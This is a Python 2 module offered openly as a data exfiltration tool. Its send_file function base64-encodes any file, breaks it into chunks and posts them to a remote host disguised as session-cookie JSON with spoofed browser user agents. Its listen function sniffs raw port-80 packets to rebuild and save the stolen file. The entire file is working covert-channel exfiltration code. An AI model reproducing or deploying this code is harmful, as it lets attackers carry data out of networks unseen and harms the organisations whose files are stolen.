#!/usr/bin/python

import os
import sys
import zlib
import json
import time
import base64
import random
import socket
import requests
import datetime
from struct import *


# Constants
USER_AGENTS = [
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	"Mozilla/2.02E (Win95; U)",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
	"Opera/7.50 (Windows XP; U)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1"]
HEADERS = {'content-type': 'application/json', 'User-Agent': random.choice(USER_AGENTS)}
READ_BINARY = "rb"
WRITE_BINARY = "wb"
LOGFILE_BASENAME = "http_log"
LOGFILE_EXT = ".txt"
HTTP_PORT = 80
ETH_P_ALL = 0x0003


# Packet configuration
INIT_PACKET_COOKIE = "sessionID"
PACKET_COOKIE = "PHPSESSID"
TERMINATION_COOKIE = "sessID0"
COOKIE_DELIMITER = ".."
DATA_END = "00000000000000"


def send_file(addr, file_path, max_packet_size=1200, time_delay=0.05):
	"""
	This function will exfiltrate the data given.
	:param addr: IP or hostname to exfiltrate the data to
	:param file_path: Path of the file to exfiltrate
	:param max_packet_size: If not set the max size is 1200
	:param time_delay: If not set time delay between packets is 0.05 seconds
	:return:
	"""
	try:
		# Load file
		fh = open(file_path, READ_BINARY)
		iAmFile = fh.read()
		fh.close()
	except:
		sys.stderr.write("Error reading file!\n")
		raise ()

	# Split file to chunks by size:
	chunks = []
	IamDone = ""

	IamDone = base64.b64encode(iAmFile)                                                         # Base64 Encode for ASCII
	checksum = zlib.crc32(IamDone)                                                              # Calculate CRC32 for later verification
	chunks = [IamDone[i:i + max_packet_size] for i in range(0, len(IamDone), max_packet_size)]  # Split into chunks
	head, tail = os.path.split(file_path)                                                       # Get filename

	# Initial packet:
	try:
		init_payload = tail + COOKIE_DELIMITER + str(checksum) + COOKIE_DELIMITER + str(len(chunks))
		payload = {INIT_PACKET_COOKIE: init_payload}
		requests.post(addr, data=json.dumps(payload), headers=HEADERS)
		sys.stdout.write("[+] Sent initiation package. Total of %s chunks.\n" % (len(chunks) + 2))
		sys.stdout.write(".")
		time.sleep(time_delay)
	except:
		sys.stderr.write("Unable to reach target with error:\n")
		raise ()

	# Send data
	current_chunk = 0
	for chunk in chunks:
		payload = {PACKET_COOKIE + str(current_chunk): chunk}
		requests.post(addr, data=json.dumps(payload), headers=HEADERS)
		current_chunk += 1
		sys.stdout.write(".")
		time.sleep(time_delay)
	sys.stdout.write(".\n")

	# Termination packet
	data = DATA_END + str(current_chunk)
	payload = {TERMINATION_COOKIE: data}
	requests.post(addr, data=json.dumps(payload), headers=HEADERS)
	sys.stdout.write("[+] Sent termination packets and total of %s packets.\n" % current_chunk)

	return 0


def listen(local_addr, local_port=80):
	"""
	This function will initiate a web listener (NOT SERVER!) on default port 80.
	It will then capture files and save them into a local file.
	:param local_addr: The ip address to bind to.
	:param local_port: The port. If not mentioned, 80 will be chosen.
	:return:
	"""
	def eth_addr(a):
		b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(a[0]), ord(a[1]), ord(a[2]), ord(a[3]), ord(a[4]), ord(a[5]))
		return b

	try:
		s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
	except socket.error, msg:
		sys.stderr.write('Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1] + "\n")
		raise ()

	try:
		# Initiate log file:
		current_time_as_string = str(datetime.datetime.now()).replace(":", ".").replace(" ", "-")[:-7]
		log_fh = open(LOGFILE_BASENAME + current_time_as_string + LOGFILE_EXT, WRITE_BINARY)
		log_fh.write("Started logging at %s\n\n" % current_time_as_string)

	except:
		sys.stderr.write("Error starting log file.\n")
		raise ()

	# Main work starts here
	while True:
		packet, address = s.recvfrom(65565)
		eth_length = 14

		eth_header = packet[:eth_length]
		eth = unpack('!6s6sH', eth_header)
		eth_protocol = socket.ntohs(eth[2])

		# Parse IP packets, IP Protocol number = 8
		if eth_protocol == 8 and address[2] == 4: # Cancel out duplicates
			# Parse IP header
			ip_header = packet[eth_length:20 + eth_length]  # 20 first chars are IP Header
			iph = unpack('!BBHHHBBH4s4s', ip_header)  # Unpacking IP Header

			version_ihl = iph[0]
			version = version_ihl >> 4
			ihl = version_ihl & 0xF
			iph_length = ihl * 4
			ttl = iph[5]
			protocol = iph[6]
			s_addr = socket.inet_ntoa(iph[8])
			d_addr = socket.inet_ntoa(iph[9])

			# TCP protocol
			# Todo; later add the option to choose a port
			if protocol == 6:
				t = iph_length + eth_length  # Add IP header and Ethernet header
				tcp_header = packet[t:t + 20]  # TCP header = 20 chars
				tcph = unpack('!HHLLBBHHH', tcp_header)  # Unpack it

				source_port = tcph[0]
				dest_port = tcph[1]
				sequence = tcph[2]
				acknowledgement = tcph[3]
				doff_reserved = tcph[4]
				tcph_length = doff_reserved >> 4

				if (dest_port == HTTP_PORT) or (source_port == HTTP_PORT):
					filename = "dfbsdgbSFGBSbSRTBsrthbSFGNsrHS$5h"      # random just to make sure no match.
					# Get the actual data
					h_size = eth_length + iph_length + tcph_length * 4
					data_size = len(packet) - h_size
					data = packet[h_size:]

					if data.find(INIT_PACKET_COOKIE) != -1:
						data_init_offset = data.find(INIT_PACKET_COOKIE)
						viable_data = data[data_init_offset:]                                           # Getting right line
						filename = viable_data[viable_data.find("\": \"") + 4:viable_data.find("..")]   # getting filename
						viable_data = viable_data[viable_data.find("..") + 2:]                          # trim it
						crc = viable_data[:viable_data.find("..")]                                      # Getting CRC
						viable_data = viable_data[viable_data.find("..") + 2:]                          # trim it
						total_packets = viable_data[:viable_data.find("\"}")]                           # Getting packet amount

						# Print user friendly information
						log_fh.write("Got initiation packet from " + str(s_addr) + ".\n")
						log_fh.write("Will now initiate capturing of: \n")
						log_fh.write("\t\tFilename:\t%s\n" % filename)
						log_fh.write("\t\tCRC32:\t\t%s\n" % crc)
						log_fh.write("\t\tTotal Packets:\t%s\n" % total_packets)
						log_fh.write("\t\tOrigin IP:\t%s\n" % s_addr)

						# Set up for file writing
						data_packets_recvd = 0
						fh = open(filename + "_" + crc, WRITE_BINARY)
						recvd_data = ""

					# Found termination
					elif data.find(TERMINATION_COOKIE) != -1:
						log_fh.write("Termination from: %s\n" % s_addr)
						if zlib.crc32(recvd_data) == int(crc):
							# CRC32 is matched. Continuing to decryption and file saving
							recvd_data = base64.b64decode(recvd_data)
							fh.write(recvd_data)
							fh.close()
							log_fh.write("[+] File has been created and saved as " + str(filename) + "_" + str(crc) + "\n")
						else:
							sys.stderr.write("[!] No CRC match! Will not be writing file.\n")

					# Found regular data
					elif data.find(PACKET_COOKIE) != -1:
						data_init_offset = data.find(PACKET_COOKIE)
						viable_data = data[data_init_offset:]  # Getting right line
						viable_data = viable_data[viable_data.find("\": \"") + 4:viable_data.find("\"}")]
						recvd_data += viable_data
						data_packets_recvd += 1
						sys.stdout.write(str(data_packets_recvd) + "-")
					else:
						# Must be regular HTTP request
						pass


if __name__ == "__main__":
	sys.stdout.write("This is meant to be a module for python and not a stand alone executable\n")